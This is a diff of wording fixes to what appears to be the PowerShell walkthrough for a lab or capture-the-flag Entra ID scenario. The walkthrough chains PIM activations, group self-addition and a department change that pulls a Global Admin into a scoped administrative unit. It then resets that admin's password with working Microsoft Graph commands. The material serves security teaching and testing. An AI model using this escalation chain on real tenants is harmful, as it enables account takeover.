@@ -9,15 +9,15 @@ Scenario 5 - Department of Escalations - AU Ready for This?
 Attack flow: 
 
 1. The attacker starts as a support user (Sarah Connor) with no direct privileges.
-She has eligible membership in "HR Support Team" and eligible ownership of "Regional HR Coordinators".
+She has an eligible membership in "HR Support Team" and an eligible ownership of "Regional HR Coordinators".
 
 2. First, the attacker activates their eligible membership in the support team.
 This grants them the "User Profile Administrator" custom role with microsoft.directory/users/basic/update permission.
 
 3. Next, they activate their eligible ownership of the Regional HR Coordinators group.
-As owner, they can add themselves as a member of this privileged group.
+As the owner, they can add themselves as a member of this privileged group.
 
-4. The Regional HR Coordinators group has Privileged Authentication Administrator role.
+4. The Regional HR Coordinators group has the Privileged Authentication Administrator role.
 BUT - it's scoped to the "HR Department" Administrative Unit, which uses dynamic membership.
 
 5. Here's the clever part: Using their user update permission, they change the Global Admin's department to "HR".
@@ -31,11 +31,11 @@ A perfect chain of legitimate features leading to complete compromise.
 
 - - - 
 
---> So... why this works?
+--> So... why does this work?
 This attack exploits several design assumptions in Azure AD:
 
 1. PIM Eligibility Chains: Eligible ownership allows self-service group management after activation.
-   Combined with eligible membership, it creates delayed privilege escalation paths.
+   Combined with an eligible membership, it creates delayed privilege escalation paths.
 
 2. Dynamic AU Membership: Dynamic rules evaluate in real-time based on user attributes.
    If you can modify attributes, you can manipulate AU membership.
@@ -104,7 +104,7 @@ foreach ($elig in $eligibilities.value) {
     }
 }
 
-# Regional HR Coordinators has the PAA role!
+# Regional HR Coordinators have the PAA role!
 
 # In the previous scenario (4), we had to leverage ownership manipulation to add ourselves to a privileged group and then reset the administrator password.
 # lets activate it now and complete the scenario (right?) 
@@ -113,7 +113,7 @@ foreach ($elig in $eligibilities.value) {
 
 $regGroup = Get-MgGroup -Filter "displayName eq 'Regional HR Coordinators'"
 
-# Activate eligible ownership of "Regional HR Coordinators" group and add ourselves as member
+# Activate eligible ownership of the "Regional HR Coordinators" group and add ourselves as members
 
 <#
 Note: The following step can also be done via the UI:
@@ -181,10 +181,10 @@ Update-MgUser -UserId $adminUser.Id -PasswordProfile @{
 # ErrorCode: Authorization_RequestDenied
 
 <#
-Why is that? we saw that we are members of a group with PAA role, so why the error?
+Why is that? we saw that we are members of a group with the PAA role, so why the error?
 
     Entra ID directory role assignments operate within defined scopes that determine where the role's permissions apply. 
-    By default, all directory role assignments have tenant-wide scope ("/"), but for granular delegation purposes, 
+    By default, all directory role assignments have a tenant-wide scope ("/"), but for granular delegation purposes, 
     you can constrain role assignments to specific Administrative Units (AUs), which limits the role's permissions to only the users,
     groups, and devices contained within that AU. Resources outside the AU remain completely out of scope for that role assignment. 
     In short, whenever we see a role which is assigned to a principal we have access to, we must verify its scope!
@@ -215,7 +215,7 @@ $au | Format-List *
 # Dynamic membership for the AU is turned on so if we can change the department of a user, we can add them to this AU and have PAA role over them!
 
 # But how can we change the department of a user? 
-# well for that we need a role with user management permissions. 
+# well, for that we need a role with user management permissions. 
 # we saw earlier that the HR Support Team group has the User Profile Administrator role; sounds like a good candidate to start from.
 
 
@@ -232,7 +232,7 @@ foreach ($assignment in $roleAssignments) {
 # Role: User Profile Administrator
 # Scoped to: /   
 
-# since its a custome role we have to check its permissions (aka Actions)
+# since it's a custom role, we have to check its permissions (aka Actions)
 $customRole = Get-MgRoleManagementDirectoryRoleDefinition -Filter "displayName eq 'User Profile Administrator'"
 $customRole.RolePermissions.AllowedResourceActions
 
@@ -242,18 +242,18 @@ $customRole.RolePermissions.AllowedResourceActions
 
 <#
 So just to recap - if we can:
-    0. Activate ownership of the PAA group -> Add ourselves as member
-    1. Activate membership in support team -> Get user update permission
-    2. Change admin's department to HR -> They join the AU
-    3. We have PAA role over that AU -> Reset their password
+    0. Activate ownership of the PAA group -> Add ourselves as members
+    1. Activate membership in the support team -> Get user update permission
+    2. Change the admin's department to HR -> They join the AU
+    3. We have the PAA role over that AU -> Reset their password
 #>
 
 # Check the admin's current department
-$adminDetails = Get-MgUser -UserId $adminUser.Id -Property Department,DisplayName
+$adminDetails = Get-MgUser -UserId $adminUser.Id -Property Department, DisplayName
 $adminDetails.Department
 
 
-# activate eligible membership in support team
+# activate eligible membership in the support team
 $memberActivationParams = @{
     accessId         = "member"
     principalId      = $currentUser.Id
@@ -275,7 +275,7 @@ Invoke-MgGraphRequest -Method POST `
     -Body $memberActivationParams -ContentType "application/json"
 
 
-# now, let's change admin's department attribute to HR and check that if that worked
+# now, let's change the admin's department attribute to HR and check if that worked
 Update-MgUser -UserId $adminUser.Id -Department "HR"
 
 (Get-MgUser -UserId $adminUser.Id -Property Department).Department
@@ -295,7 +295,7 @@ Update-MgUser -UserId $adminUser.Id -PasswordProfile @{
     ForceChangePasswordNextSignIn = $false
 }
 
-# Step 5: Login as admin and retrieving the flag using BARK
+# Step 5: Log in as admin and retrieve the flag
 Disconnect-MgGraph
 
 $adminToken = Get-MSGraphTokenWithUsernamePassword -Username $adminUser.UserPrincipalName -Password $newPwd -TenantID $tenantId
@@ -311,7 +311,7 @@ Invoke-MgGraphRequest -Uri 'https://graph.microsoft.com/v1.0/me?$select=id,userP
 Disconnect-MgGraph
 
 
-# Don't forget to run the cleanup script to restore the tenant to it's original state!
-# To learn more about how the scenario is created, consider running the setup script with the -Verbose flag and reviewing the its source code.
+# Don't forget to run the cleanup script to restore the tenant to its original state!
+# To learn more about how the scenario is created, consider running the setup script with the -Verbose flag and reviewing its source code.
 
 # Official blog post: https://www.semperis.com/blog/
